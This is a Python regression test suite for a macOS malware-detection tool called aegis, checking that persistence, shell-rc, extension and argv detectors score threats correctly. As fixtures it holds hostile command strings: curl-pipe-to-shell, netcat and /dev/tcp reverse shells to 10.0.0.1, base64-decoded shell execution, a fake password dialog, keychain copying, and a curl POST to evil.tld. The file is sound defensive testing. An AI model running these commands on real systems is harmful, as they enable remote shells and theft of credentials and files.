#!/usr/bin/env python3
"""Regression suite for aegis — one test per bug found in the battle-test pass.

Zero third-party deps (stdlib `unittest` only), matching the tool's own trust
model. Fully sandboxed: every ~/.aegis path, the persistence/hot dirs, and
`notify` are redirected into a per-test tmp dir, so this NEVER reads or writes
real state and NEVER fires a desktop notification. Each test is named for the
finding it pins and would FAIL against the pre-fix code.

Run:  python3 -m unittest discover -s tests        (from the repo root)
  or: python3 tests/test_regression.py
"""
import json
import os
import plistlib
import subprocess
import sys
import tempfile
import time
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import aegis  # noqa: E402


class Sandbox(unittest.TestCase):
    """Base: redirect all aegis state/scan surfaces into a throwaway tmp dir."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="aegis_rt_")
        self.state = os.path.join(self.tmp, ".aegis")
        self.pers = os.path.join(self.tmp, "LaunchAgents")
        self.hot = os.path.join(self.tmp, "hot")
        for d in (self.state, self.pers, self.hot):
            os.makedirs(d)

        self._saved = {}
        overrides = {
            "STATE_DIR": self.state,
            "BASELINE": os.path.join(self.state, "baseline.json"),
            "FINDINGS_LOG": os.path.join(self.state, "findings.jsonl"),
            "LATEST_MD": os.path.join(self.state, "latest.md"),
            "LATEST_JSON": os.path.join(self.state, "latest.json"),
            "SEEN": os.path.join(self.state, "seen.json"),
            "SIGCACHE": os.path.join(self.state, "sigcache.json"),
            "ALLOWLIST": os.path.join(self.state, "allowlist.json"),
            "RUN_LOG": os.path.join(self.state, "run.log"),
            "SELFSTATE": os.path.join(self.state, "selfstate.json"),
            "SELF_PLIST": os.path.join(self.state, "com.charlie.aegis.plist"),
            "PERSISTENCE_DIRS": [self.pers],
            "HOT_DIRS": [self.hot],
            # New baseline-diffed surfaces read real machine state (shell rc,
            # profiles, browser extensions) — pin them empty so tests are
            # deterministic and never depend on the dev host. Individual tests
            # override a single surface to exercise it.
            "SHELL_RC_FILES": [],
            "EXTRA_PERSIST_FILES": [],
            "EXTRA_PERSIST_DIRS": [],
            "BROWSER_EXT_ROOTS": [],
            "IDE_EXT_ROOTS": [],
            # Behavioral-tier surfaces likewise read the live host (shell history,
            # /tmp staging, wallet apps, canaries, XProtect). Pin them empty/sandboxed
            # so cmd_scan-level tests are deterministic; dedicated tests point a
            # single global at fixture data to exercise it.
            "SHELL_HISTORY_FILES": [],
            "STAGING_DIRS": [],
            "WALLET_CONFIG_FILES": [],
            "WALLET_APP_BINS": [],
            "XPROTECT_BUNDLES": [],
            "CANARY_DIRS": [],
            "CANARY_STATE": os.path.join(self.state, "canaries.json"),
            "_sigcache": {},
        }
        for k, v in overrides.items():
            self._saved[k] = getattr(aegis, k)
            setattr(aegis, k, v)

        self.notifications = []
        self._saved["notify"] = aegis.notify
        aegis.notify = lambda title, msg: self.notifications.append((title, msg))
        # check_behavior() reads the live process table and check_xprotect() shells
        # out to `log show`; both are non-deterministic on a dev host. Stub them to
        # empty for cmd_scan-level tests — dedicated tests call the pure helpers
        # (_argv_signals) and check_xprotect parsing directly.
        for fn in ("check_behavior", "check_xprotect"):
            self._saved[fn] = getattr(aegis, fn)
            setattr(aegis, fn, (lambda *a, **k: []))

    def tearDown(self):
        for k, v in self._saved.items():
            setattr(aegis, k, v)
        subprocess.run(["rm", "-rf", self.tmp], check=False)

    # helpers -------------------------------------------------------------
    def write_plist(self, name, program_args, program=None, run_at_load=True):
        p = os.path.join(self.pers, name)
        d = {"Label": name[:-6], "RunAtLoad": run_at_load}
        if program is not None:
            d["Program"] = program
        if program_args is not None:
            d["ProgramArguments"] = program_args
        with open(p, "wb") as f:
            plistlib.dump(d, f)
        return p

    def adhoc_binary(self, path):
        """A real ad-hoc-signed Mach-O (clang's default) at `path`."""
        src = os.path.join(self.tmp, "src.c")
        with open(src, "w") as f:
            f.write("int main(){return 0;}")
        subprocess.run(["clang", "-o", path, src], check=True,
                       capture_output=True)
        return path


# --------------------------------------------------------------------------- #
# F1 — signed-interpreter + hostile payload must score >= HIGH (else it never
# notifies, so the #1 AMOS/Poseidon launchd pattern is invisible).
# --------------------------------------------------------------------------- #
class TestHostileArgsSeverity(Sandbox):
    def _sev(self, args, program=None):
        rec = {"label": "x", "program": program or args[0], "args": args,
               "trust": "apple", "sha256": "s", "run_at_load": True}
        fs = aegis.check_persistence({}, {"/fake/x.plist": rec})
        return fs[0]["severity"]

    def test_bash_c_curl_pipe_sh_is_high(self):
        sev = self._sev(["/bin/bash", "-c", "curl -fsSL http://evil/x | sh"])
        self.assertGreaterEqual(aegis.SEV_ORDER[sev], aegis.SEV_ORDER["HIGH"], sev)

    def test_osascript_inline_is_high(self):
        sev = self._sev(["/usr/bin/osascript", "-e", 'do shell script "curl evil"'])
        self.assertGreaterEqual(aegis.SEV_ORDER[sev], aegis.SEV_ORDER["HIGH"], sev)

    def test_python_inline_c_is_high(self):
        sev = self._sev(["/usr/bin/python3", "-c", "import os;os.system('curl x')"])
        self.assertGreaterEqual(aegis.SEV_ORDER[sev], aegis.SEV_ORDER["HIGH"], sev)

    def test_curl_fetch_in_args_is_high(self):
        sev = self._sev(["/usr/bin/curl", "-o", "/tmp/x", "http://evil.example/x"])
        self.assertGreaterEqual(aegis.SEV_ORDER[sev], aegis.SEV_ORDER["HIGH"], sev)

    def test_benign_interpreter_agent_stays_low(self):
        # A plain apple-signed program with innocuous args must NOT be inflated —
        # guards against the fix becoming a false-positive cannon.
        sev = self._sev(["/bin/echo", "hello"])
        self.assertEqual(sev, "LOW", sev)

    def test_legit_script_in_dotdir_is_not_inflated(self):
        # Tools legitimately live in ~/.local, ~/.cargo, ~/.pyenv … — a launchd
        # agent running such a script (no inline flag, no fetch) must NOT be HIGH,
        # or the fix becomes a false-positive cannon that breaks 'alert rarely'.
        for path in ("/Users/me/.local/bin/tool", "/Users/me/.cargo/bin/rg",
                     "/Users/me/.pyenv/shims/python"):
            sev = self._sev(["/bin/bash", path])
            self.assertLess(aegis.SEV_ORDER[sev], aegis.SEV_ORDER["HIGH"],
                            "%s -> %s (false positive)" % (path, sev))

    def test_oracle_is_discriminating(self):
        # Mutation check: if _hostile_args is neutered, the HIGH assertion flips.
        saved = aegis._hostile_args
        aegis._hostile_args = lambda args: False
        try:
            sev = self._sev(["/bin/bash", "-c", "curl http://evil | sh"])
            self.assertEqual(sev, "LOW")  # proves the test depends on the mechanism
        finally:
            aegis._hostile_args = saved


# --------------------------------------------------------------------------- #
# F2 — a corrupt baseline must NOT silently re-baseline (erasing tamper evidence).
# --------------------------------------------------------------------------- #
class TestCorruptBaseline(Sandbox):
    def test_corrupt_baseline_alerts_and_does_not_retrust(self):
        aegis.cmd_scan(quiet=True)  # clean first-run baseline
        # attacker plants a new adhoc launch item AND corrupts the baseline
        self.write_plist("com.evil.plist", [self.adhoc_binary("/tmp/aegis_rt_pl")])
        with open(aegis.BASELINE, "w") as f:
            f.write("{ this is not valid json ")
        self.notifications.clear()
        aegis.cmd_scan(quiet=True)
        with open(aegis.LATEST_JSON) as fh:
            data = json.load(fh)
        fps = [x["fingerprint"] for x in data["findings"]]
        self.assertIn("integrity:baseline:corrupt", fps)
        # the planted malware is re-surfaced (not folded into known-good)…
        self.assertTrue(any(f["category"] == "persistence"
                            and "evil" in f["detail"].lower()
                            for f in data["findings"]))
        # …and something HIGH+ actually notified (not silent).
        self.assertTrue(self.notifications)
        subprocess.run(["rm", "-f", "/tmp/aegis_rt_pl"], check=False)


# --------------------------------------------------------------------------- #
# F3 — first-run silence is for PERSISTENCE only; a live hot-dir threat present
# at install must still alert (and keep being alertable, not swallowed by `seen`).
# --------------------------------------------------------------------------- #
class TestFirstRunScoping(Sandbox):
    def setUp(self):
        super().setUp()
        # Isolate the surface under test: stub the two checks that read real
        # machine state (hardening CLIs, running processes) so the result is
        # deterministic regardless of what this host happens to be running.
        self._saved_checks = (aegis.check_hardening, aegis.check_processes)
        aegis.check_hardening = lambda: []
        aegis.check_processes = lambda: []

    def tearDown(self):
        aegis.check_hardening, aegis.check_processes = self._saved_checks
        super().tearDown()

    def test_hotdir_threat_present_at_first_scan_notifies(self):
        self.adhoc_binary(os.path.join(self.hot, "payload"))
        aegis.cmd_scan(quiet=True)  # the VERY FIRST scan
        self.assertTrue(self.notifications,
                        "a hot-dir threat present before install must alert")

    def test_persistence_at_first_scan_stays_silent(self):
        self.write_plist("com.evil.plist", [self.adhoc_binary("/tmp/aegis_rt_p2")])
        aegis.cmd_scan(quiet=True)
        self.assertEqual(self.notifications, [],
                         "first-run persistence is baselined silently")
        subprocess.run(["rm", "-f", "/tmp/aegis_rt_p2"], check=False)


# --------------------------------------------------------------------------- #
# F4 — a different binary reusing an allowed path must NOT be silently covered.
# --------------------------------------------------------------------------- #
class TestFingerprintContentHash(Sandbox):
    def setUp(self):
        super().setUp()
        self._h = aegis.check_hardening
        aegis.check_hardening = lambda: []

    def tearDown(self):
        aegis.check_hardening = self._h
        super().tearDown()

    def test_hotdir_fingerprint_changes_when_content_changes(self):
        p = os.path.join(self.hot, "tool")
        self.adhoc_binary(p)
        f1 = aegis.check_hot_dirs()[0]["fingerprint"]
        # replace with different content at the SAME path
        with open(os.path.join(self.tmp, "s2.c"), "w") as f:
            f.write("int main(){return 42;}")
        subprocess.run(["clang", "-o", p, os.path.join(self.tmp, "s2.c")],
                       check=True, capture_output=True)
        aegis._sigcache = {}
        f2 = aegis.check_hot_dirs()[0]["fingerprint"]
        self.assertNotEqual(f1, f2, "different binary at reused path = new finding")


# --------------------------------------------------------------------------- #
# F5/F6 — location partitions: /usr/local and /private/var/folders are risky.
# --------------------------------------------------------------------------- #
class TestRiskyLocations(Sandbox):
    def test_usr_local_is_risky(self):
        self.assertTrue(aegis.is_risky_location("/usr/local/bin/evil"))

    def test_usr_bin_still_trusted(self):
        self.assertFalse(aegis.is_risky_location("/usr/bin/ls"))

    def test_private_var_folders_is_risky(self):
        self.assertTrue(
            aegis.is_risky_location("/private/var/folders/zz/abc/T/tool"))

    def test_var_folders_still_risky(self):
        self.assertTrue(aegis.is_risky_location("/var/folders/zz/abc/T/tool"))

    def test_usr_local_process_is_inspected(self):
        # canned `ps` + forced-adhoc classifier: a /usr/local process must be
        # flagged (pre-fix it was short-circuited as trusted and never checked).
        saved_run, saved_cls = aegis.run, aegis.classify_signature
        aegis.run = lambda cmd, timeout=15: (
            ("1234 /usr/local/bin/evil\n", "", 0)
            if cmd[:2] == ["ps", "-axo"] else ("", "", 0))
        aegis.classify_signature = lambda p: {"trust": "adhoc", "team": None,
                                              "authority": None}
        try:
            fs = aegis.check_processes()
            self.assertTrue(any(f["path"] == "/usr/local/bin/evil" for f in fs))
        finally:
            aegis.run, aegis.classify_signature = saved_run, saved_cls


# --------------------------------------------------------------------------- #
# F7 — sigcache must invalidate on content change and stay one-entry-per-path.
# --------------------------------------------------------------------------- #
class TestSigcacheKeying(Sandbox):
    def test_cache_invalidates_and_does_not_orphan(self):
        p = self.adhoc_binary("/tmp/aegis_rt_sc")
        try:
            aegis.classify_signature(p)
            stat1 = aegis._sigcache[p]["stat"]
            with open(os.path.join(self.tmp, "s3.c"), "w") as f:
                f.write("int main(){return 7;}")
            subprocess.run(["clang", "-o", p, os.path.join(self.tmp, "s3.c")],
                           check=True, capture_output=True)
            aegis.classify_signature(p)
            self.assertEqual(len(aegis._sigcache), 1,
                             "one entry per path — no orphaned stale key")
            self.assertNotEqual(aegis._sigcache[p]["stat"], stat1,
                                "stat-signature refreshed on content change")
        finally:
            subprocess.run(["rm", "-f", p], check=False)


# --------------------------------------------------------------------------- #
# F8 — seen.json is bounded (an hourly-forever tool can't grow it without limit).
# --------------------------------------------------------------------------- #
class TestSeenCap(Sandbox):
    def test_cap_seen_keeps_newest(self):
        n = aegis.SEEN_MAX + 250
        # exactly SEEN_MAX "new" (2026) entries + 250 "old" (2025) ones → the cap
        # must keep precisely the 2026 block and drop every 2025 entry.
        seen = {"fp%06d" % i: ("2026" if i < aegis.SEEN_MAX else "2025")
                + "-01-01T00:00:00+00:00" for i in range(n)}
        capped = aegis._cap_seen(seen)
        self.assertEqual(len(capped), aegis.SEEN_MAX)
        self.assertTrue(all(v.startswith("2026") for v in capped.values()),
                        "cap retains the newest entries by timestamp")

    def test_cap_seen_noop_under_limit(self):
        seen = {"a": "2026-01-01T00:00:00+00:00"}
        self.assertIs(aegis._cap_seen(seen), seen)


# --------------------------------------------------------------------------- #
# F-eff — the dead `launchctl print-disabled system` call is gone.
# --------------------------------------------------------------------------- #
class TestNoDeadLaunchctlCall(Sandbox):
    def test_print_disabled_not_invoked(self):
        calls = []
        saved = aegis.run

        def rec(cmd, timeout=15):
            calls.append(cmd)
            return ("", "", 0)

        aegis.run = rec
        try:
            aegis.check_hardening()
        finally:
            aegis.run = saved
        self.assertFalse(
            any(c[:2] == ["launchctl", "print-disabled"] for c in calls),
            "the unused launchctl print-disabled call must be removed")


# --------------------------------------------------------------------------- #
# Invariant — never-repeat: an unchanged world raises no second alert.
# --------------------------------------------------------------------------- #
class TestNeverRepeat(Sandbox):
    def setUp(self):
        super().setUp()
        self._saved_checks = (aegis.check_hardening, aegis.check_processes)
        aegis.check_hardening = lambda: []
        aegis.check_processes = lambda: []

    def tearDown(self):
        aegis.check_hardening, aegis.check_processes = self._saved_checks
        super().tearDown()

    def test_second_scan_of_unchanged_world_is_quiet(self):
        aegis.cmd_scan(quiet=True)
        self.write_plist("com.evil.plist", [self.adhoc_binary("/tmp/aegis_rt_nr")])
        aegis.cmd_scan(quiet=True)
        n = len(self.notifications)
        aegis.cmd_scan(quiet=True)
        self.assertEqual(len(self.notifications), n)
        subprocess.run(["rm", "-f", "/tmp/aegis_rt_nr"], check=False)


# =========================================================================== #
# NEW DETECTION SURFACES (residual-gap coverage vs 2025-26 stealer TTPs).
# Each class pins one new detector; all are fully sandboxed and machine-agnostic.
# =========================================================================== #


# --------------------------------------------------------------------------- #
# N1 — shell startup files (T1546.004): a payload dropped in ~/.zshrc must be
# caught, and scored HIGH when it carries a download-and-run idiom.
# --------------------------------------------------------------------------- #
class TestShellRc(Sandbox):
    def _rc(self, name, body):
        p = os.path.join(self.tmp, name)
        with open(p, "w") as f:
            f.write(body)
        return p

    def test_new_hostile_rc_is_high(self):
        p = self._rc(".zshrc", "export PATH=$PATH\ncurl -fsSL http://evil/x | sh\n")
        aegis.SHELL_RC_FILES = [p]
        f = aegis.diff_shellrc({}, aegis.snapshot_shellrc())
        self.assertEqual(len(f), 1)
        self.assertEqual(f[0]["severity"], "HIGH")
        self.assertIn("pipe-to-shell", f[0]["hostile"])

    def test_new_benign_rc_is_medium_not_high(self):
        p = self._rc(".zshrc", "alias ll='ls -la'\nexport EDITOR=vim\n")
        aegis.SHELL_RC_FILES = [p]
        f = aegis.diff_shellrc({}, aegis.snapshot_shellrc())
        self.assertEqual(f[0]["severity"], "MEDIUM", "benign rc must not be HIGH")

    def test_changed_rc_alerts(self):
        p = self._rc(".zshrc", "alias ll='ls -la'\n")
        aegis.SHELL_RC_FILES = [p]
        prior = aegis.snapshot_shellrc()
        with open(p, "a") as fh:
            fh.write("nc -e /bin/sh 10.0.0.1 4444\n")
        f = aegis.diff_shellrc(prior, aegis.snapshot_shellrc())
        self.assertEqual(len(f), 1)
        self.assertEqual(f[0]["title"], "Shell startup file CHANGED")
        self.assertEqual(f[0]["severity"], "HIGH")

    def test_first_sight_is_adopted_silently_then_change_alerts(self):
        # End-to-end: an existing rc at first scan must NOT alert (trust what's
        # installed); a mutation AFTER baseline must.
        p = self._rc(".zshrc", "alias ll='ls -la'\n")
        aegis.SHELL_RC_FILES = [p]
        aegis.check_hardening = lambda: []
        aegis.check_processes = lambda: []
        aegis.cmd_scan(quiet=True)                      # first run: adopt
        self.assertEqual(self.notifications, [])
        with open(p, "a") as fh:
            fh.write("curl http://evil | sh\n")         # attacker appends
        aegis.cmd_scan(quiet=True)
        self.assertTrue(self.notifications, "post-baseline rc change must alert")


# --------------------------------------------------------------------------- #
# N2 — DYLD code-injection env in a launchd plist scores >= HIGH even when the
# program itself is Apple-signed (AMOS/Poseidon dylib-injection persistence).
# --------------------------------------------------------------------------- #
class TestDyldInjection(Sandbox):
    def test_dyld_insert_libraries_is_high(self):
        rec = {"label": "x", "program": "/usr/bin/python3", "args": None,
               "trust": "apple", "sha256": "s", "run_at_load": True,
               "env": {"DYLD_INSERT_LIBRARIES": "/Users/me/.hidden/evil.dylib"}}
        fs = aegis.check_persistence({}, {"/fake/x.plist": rec})
        self.assertGreaterEqual(aegis.SEV_ORDER[fs[0]["severity"]],
                                aegis.SEV_ORDER["HIGH"])

    def test_snapshot_captures_only_injection_env(self):
        import plistlib as _p
        path = os.path.join(self.pers, "com.x.plist")
        with open(path, "wb") as f:
            _p.dump({"Label": "x", "Program": "/usr/bin/true",
                     "EnvironmentVariables": {"DYLD_INSERT_LIBRARIES": "/tmp/e.dylib",
                                              "LANG": "en_US.UTF-8"}}, f)
        snap = aegis.snapshot_persistence()
        env = snap[path]["env"]
        self.assertEqual(env, {"DYLD_INSERT_LIBRARIES": "/tmp/e.dylib"},
                         "only injection-relevant env kept (no PII/noise)")


# --------------------------------------------------------------------------- #
# N3 — expanded hostile-arg idioms in launchd persistence (base64|sh, /dev/tcp).
# --------------------------------------------------------------------------- #
class TestExpandedHostileArgs(Sandbox):
    def _sev(self, args):
        rec = {"label": "x", "program": args[0], "args": args, "trust": "apple",
               "sha256": "s", "run_at_load": True, "env": None}
        return aegis.check_persistence({}, {"/fake/x.plist": rec})[0]["severity"]

    def test_base64_decode_pipe_shell_is_high(self):
        sev = self._sev(["/bin/sh", "-lc", "echo aGkK | base64 -d | sh"])
        self.assertGreaterEqual(aegis.SEV_ORDER[sev], aegis.SEV_ORDER["HIGH"])

    def test_dev_tcp_reverse_shell_is_high(self):
        # No inline flag, no interpreter, no fetch keyword: caught purely by the
        # /dev/tcp reverse-shell idiom embedded in the arguments.
        sev = self._sev(["/opt/tool", "run", "exec 5<>/dev/tcp/10.0.0.1/4444"])
        self.assertGreaterEqual(aegis.SEV_ORDER[sev], aegis.SEV_ORDER["HIGH"])

    def test_benign_args_stay_low(self):
        self.assertEqual(self._sev(["/bin/echo", "hello world"]), "LOW")


# --------------------------------------------------------------------------- #
# N4 — quarantine provenance: a side-loaded (no-quarantine) hot-dir binary is
# annotated as Gatekeeper-bypassing; the download agent is parsed when present.
# --------------------------------------------------------------------------- #
class TestQuarantineProvenance(Sandbox):
    def test_origin_absent_and_present(self):
        p = os.path.join(self.tmp, "f")
        with open(p, "w") as f:
            f.write("x")
        self.assertEqual(aegis.quarantine_origin(p), (False, None))
        subprocess.run(["xattr", "-w", "com.apple.quarantine",
                        "0081;00000000;Safari;ABC", p], check=False)
        present, agent = aegis.quarantine_origin(p)
        self.assertTrue(present)
        self.assertEqual(agent, "Safari")

    def test_hotdir_side_loaded_note(self):
        payload = self.adhoc_binary(os.path.join(self.hot, "payload"))
        # clang output has no quarantine xattr → side-loaded
        f = [x for x in aegis.check_hot_dirs() if x["path"] == payload]
        self.assertTrue(f)
        self.assertFalse(f[0]["quarantined"])
        self.assertIn("side-loaded", f[0]["detail"])


# --------------------------------------------------------------------------- #
# N5 — self-protection: tamper on the monitor's own state is a HIGH signal, with
# no false positive on a machine that never installed the launchd agent.
# --------------------------------------------------------------------------- #
class TestSelfProtection(Sandbox):
    def test_log_truncation_detected(self):
        with open(aegis.FINDINGS_LOG, "w") as f:
            f.write("a" * 10)
        aegis.save_json(aegis.SELFSTATE, {"findings_size": 9999})
        fps = [x["fingerprint"] for x in aegis.check_self_protection()]
        self.assertTrue(any(fp.startswith("self:log:truncated") for fp in fps))

    def test_agent_removed_only_after_learned(self):
        # never installed → silent
        self.assertEqual(aegis.check_self_protection(), [])
        # learned installed, plist now gone → HIGH
        aegis.save_json(aegis.SELFSTATE, {"installed": True})
        fps = [x["fingerprint"] for x in aegis.check_self_protection()]
        self.assertIn("self:agent:removed", fps)

    def test_no_false_positive_on_growing_log(self):
        with open(aegis.FINDINGS_LOG, "w") as f:
            f.write("a" * 100)
        aegis.save_json(aegis.SELFSTATE, {"findings_size": 50})  # grew, fine
        fps = [x["fingerprint"] for x in aegis.check_self_protection()]
        self.assertFalse(any("truncated" in fp for fp in fps))


# --------------------------------------------------------------------------- #
# N6 — config profiles & login hooks: a newly-installed profile or hook alerts.
# --------------------------------------------------------------------------- #
class TestProfilesAndHooks(Sandbox):
    def test_new_profile_is_high(self):
        f = aegis.diff_profiles({}, {"com.evil.mdm": True})
        self.assertEqual(len(f), 1)
        self.assertEqual(f[0]["severity"], "HIGH")
        self.assertEqual(f[0]["category"], "config-profile")

    def test_preexisting_profile_not_realerted(self):
        prior = {"com.corp.wifi": True}
        self.assertEqual(aegis.diff_profiles(prior, {"com.corp.wifi": True}), [])

    def test_new_loginhook_is_high(self):
        f = aegis.diff_loginhooks({}, {"LoginHook": "/tmp/evil.sh"})
        self.assertEqual(f[0]["severity"], "HIGH")
        self.assertEqual(f[0]["category"], "persistence")


# --------------------------------------------------------------------------- #
# N7 — browser extension inventory diff: a newly-appearing extension alerts.
# --------------------------------------------------------------------------- #
class TestBrowserExtensions(Sandbox):
    def _chromium(self, extid, name):
        root = os.path.join(self.tmp, "Chrome")
        vdir = os.path.join(root, "Default", "Extensions", extid, "1.0")
        os.makedirs(vdir)
        with open(os.path.join(vdir, "manifest.json"), "w") as f:
            json.dump({"name": name}, f)
        return root

    def test_new_extension_detected_with_name(self):
        root = self._chromium("abcdefghijklmnop", "Evil Wallet Drainer")
        aegis.BROWSER_EXT_ROOTS = [(root, "chromium")]
        snap = aegis.snapshot_browserext()
        self.assertTrue(any("abcdefghijklmnop" in k for k in snap))
        f = aegis.diff_browserext({}, snap)
        self.assertEqual(len(f), 1)
        self.assertEqual(f[0]["severity"], "MEDIUM")
        self.assertIn("Evil Wallet Drainer", f[0]["detail"])


# --------------------------------------------------------------------------- #
# N8 — upgrade safety: an EXISTING install (baseline has only "persistence")
# gaining newly-watched surfaces must adopt them SILENTLY, not alert-storm.
# --------------------------------------------------------------------------- #
class TestSurfaceAdoptionOnUpgrade(Sandbox):
    def test_existing_install_adopts_new_surface_silently(self):
        rc = os.path.join(self.tmp, ".zshrc")
        with open(rc, "w") as f:
            f.write("curl http://evil | sh\n")   # even a hostile-looking rc…
        aegis.SHELL_RC_FILES = [rc]
        aegis.check_hardening = lambda: []
        aegis.check_processes = lambda: []
        # simulate a pre-upgrade baseline: persistence key only, no "shellrc".
        aegis.save_json(aegis.BASELINE,
                        {"created": "2026-01-01T00:00:00+00:00", "persistence": {}})
        aegis.cmd_scan(quiet=True)
        # …is adopted as known-good on first sight (no alert storm on upgrade)…
        self.assertEqual(self.notifications, [],
                         "first sighting of a surface is adopted silently")
        # …and the baseline now carries the surface for future diffing.
        with open(aegis.BASELINE) as fh:
            base = json.load(fh)
        self.assertIn("shellrc", base)


# --------------------------------------------------------------------------- #
# N9 — AMOS/Atomic 2025: a launchd job running an Apple-signed interpreter
# against a HIDDEN SCRIPT in $HOME (`/bin/bash ~/.agent`) must score HIGH — the
# binary+location look safe, the script's home is the tell.
# --------------------------------------------------------------------------- #
class TestHiddenHomeScriptPersistence(Sandbox):
    def _sev(self, args, program="/bin/bash"):
        rec = {"label": "com.finder.helper", "program": program, "args": args,
               "trust": "apple", "sha256": "s", "run_at_load": True, "env": None}
        return aegis.check_persistence({}, {"/fake/x.plist": rec})[0]["severity"]

    def test_bash_hidden_home_script_is_high(self):
        sev = self._sev(["/bin/bash", os.path.join(aegis.HOME, ".agent")])
        self.assertGreaterEqual(aegis.SEV_ORDER[sev], aegis.SEV_ORDER["HIGH"], sev)

    def test_interpreter_tmp_script_is_high(self):
        sev = self._sev(["/usr/bin/python3", "/tmp/.x.py"], program="/usr/bin/python3")
        self.assertGreaterEqual(aegis.SEV_ORDER[sev], aegis.SEV_ORDER["HIGH"], sev)

    def test_legit_dotdir_tool_stays_low(self):
        # ~/.local/bin, ~/.cargo/bin etc. are conventional — must NOT inflate.
        for tool in (".local/bin/tool", ".cargo/bin/rg", ".pyenv/shims/python"):
            sev = self._sev(["/bin/bash", os.path.join(aegis.HOME, tool)])
            self.assertLess(aegis.SEV_ORDER[sev], aegis.SEV_ORDER["HIGH"],
                            "%s -> %s (false positive)" % (tool, sev))


# --------------------------------------------------------------------------- #
# N10 — RustBucket/BlueNoroff: a plist whose label impersonates Apple
# (`com.apple.systemupdate`) but whose program is NOT Apple-signed (hijacked
# Developer-ID cert) must be HIGH — signature checks alone wave it through.
# --------------------------------------------------------------------------- #
class TestAppleLabelImpersonation(Sandbox):
    def _sev(self, label, trust, program="/Users/x/Library/Metadata/Update"):
        rec = {"label": label, "program": program, "args": None, "trust": trust,
               "sha256": "s", "run_at_load": True, "env": None}
        return aegis.check_persistence({}, {"/fake/x.plist": rec})[0]["severity"]

    def test_apple_label_developer_id_program_is_high(self):
        sev = self._sev("com.apple.systemupdate", "developer-id")
        self.assertGreaterEqual(aegis.SEV_ORDER[sev], aegis.SEV_ORDER["HIGH"], sev)

    def test_genuinely_apple_signed_is_not_inflated_by_this_rule(self):
        # A com.apple.* label whose program really IS Apple-signed and lives in a
        # trusted path must not be forced HIGH by the impersonation rule.
        sev = self._sev("com.apple.updater", "apple", program="/usr/bin/true")
        self.assertLess(aegis.SEV_ORDER[sev], aegis.SEV_ORDER["HIGH"], sev)


# --------------------------------------------------------------------------- #
# N11 — DPRK "Hidden Risk": a newly-created login-scoped rc (~/.zshenv) is HIGH
# even with benign-looking content; a new interactive-only ~/.zshrc is MEDIUM.
# --------------------------------------------------------------------------- #
class TestLoginScopedRc(Sandbox):
    def _new(self, name, body="export PATH=$PATH\n"):
        p = os.path.join(self.tmp, name)
        with open(p, "w") as f:
            f.write(body)
        aegis.SHELL_RC_FILES = [p]
        return aegis.diff_shellrc({}, aegis.snapshot_shellrc())[0]

    def test_new_zshenv_is_high(self):
        self.assertEqual(self._new(".zshenv")["severity"], "HIGH")

    def test_new_zshrc_is_medium(self):
        self.assertEqual(self._new(".zshrc")["severity"], "MEDIUM")

    def test_changed_zshenv_is_medium_when_benign(self):
        p = os.path.join(self.tmp, ".zshenv")
        with open(p, "w") as f:
            f.write("export A=1\n")
        aegis.SHELL_RC_FILES = [p]
        prior = aegis.snapshot_shellrc()
        with open(p, "a") as f:
            f.write("export B=2\n")   # benign change, not a fresh install
        self.assertEqual(
            aegis.diff_shellrc(prior, aegis.snapshot_shellrc())[0]["severity"],
            "MEDIUM")


# --------------------------------------------------------------------------- #
# N12 — Objective-See "Paradox" 2025: a backdoored IDE (VSCode/Cursor) extension
# must be inventoried and a new one alerted.
# --------------------------------------------------------------------------- #
class TestIdeExtensions(Sandbox):
    def test_new_cursor_extension_detected(self):
        root = os.path.join(self.tmp, ".cursor", "extensions")
        extdir = os.path.join(root, "evil.wallet-drainer-1.0.0")
        os.makedirs(extdir)
        with open(os.path.join(extdir, "package.json"), "w") as f:
            json.dump({"name": "wallet-drainer", "displayName": "Wallet Helper"}, f)
        aegis.IDE_EXT_ROOTS = [root]
        snap = aegis.snapshot_ide_ext()
        self.assertTrue(any("evil.wallet-drainer" in k for k in snap))
        f = aegis.diff_ide_ext({}, snap)
        self.assertEqual(len(f), 1)
        self.assertEqual(f[0]["category"], "ide-ext")
        self.assertEqual(f[0]["severity"], "MEDIUM")


# --------------------------------------------------------------------------- #
# N13 — Objective-See "Phexia" 2025: an interpreter (osascript) launched against
# a script in a user-writable location scores MEDIUM (logged), not LOW (buried),
# while a signed interpreter against a trusted-path script stays LOW.
# --------------------------------------------------------------------------- #
class TestInterpreterScriptTarget(Sandbox):
    def _sev(self, args):
        rec = {"label": "com.user.x", "program": args[0], "args": args,
               "trust": "apple", "sha256": "s", "run_at_load": True, "env": None}
        return aegis.check_persistence({}, {"/fake/x.plist": rec})[0]["severity"]

    def test_phexia_osascript_userlib_script_is_medium(self):
        sev = self._sev(["/usr/bin/osascript",
                         os.path.join(aegis.HOME, "Library", "gfskjsnghdjsvuxj")])
        self.assertEqual(sev, "MEDIUM", sev)

    def test_interpreter_against_trusted_script_stays_low(self):
        # /etc is not in RISKY_PREFIXES and not hidden → stays LOW.
        self.assertEqual(self._sev(["/bin/bash", "/etc/somewhere"]), "LOW")


# --------------------------------------------------------------------------- #
# N14 — BEHAVIORAL argv tier: the fileless-stealer signals. High-precision
# structural signals notify (HIGH/CRITICAL); a lone benign-installer idiom stays
# MEDIUM (below notify) so a Homebrew/rustup `curl | bash` in flight is not a HIGH.
# --------------------------------------------------------------------------- #
class TestArgvSignals(Sandbox):
    def _sev(self, argv):
        sigs = aegis._argv_signals(argv)
        if not sigs:
            return None
        return max(sigs, key=lambda s: aegis.SEV_ORDER[s[1]])[1]

    def test_osascript_password_phish_is_critical(self):
        self.assertEqual(self._sev(
            'osascript -e display dialog "System update needs your password" '
            'default answer "" with hidden answer'), "CRITICAL")

    def test_dscl_authonly_is_high(self):
        self.assertEqual(self._sev('dscl . -authonly user hunter2'), "HIGH")

    def test_quarantine_strip_is_high(self):
        self.assertEqual(self._sev('xattr -dr com.apple.quarantine /tmp/update'), "HIGH")
        self.assertEqual(self._sev('xattr -c /tmp/update'), "HIGH")

    def test_hdiutil_nobrowse_is_high(self):
        self.assertEqual(self._sev('hdiutil attach -nobrowse /tmp/x.dmg'), "HIGH")

    def test_tccutil_reset_is_high(self):
        self.assertEqual(self._sev('tccutil reset All'), "HIGH")

    def test_keychain_db_access_is_high(self):
        self.assertEqual(self._sev(
            'cp /Users/x/Library/Keychains/login.keychain-db /tmp/kc'), "HIGH")

    def test_curl_exfil_post_is_high(self):
        self.assertEqual(self._sev(
            'curl -k -X POST -F file=@/tmp/app.zip https://evil.tld/up'), "HIGH")
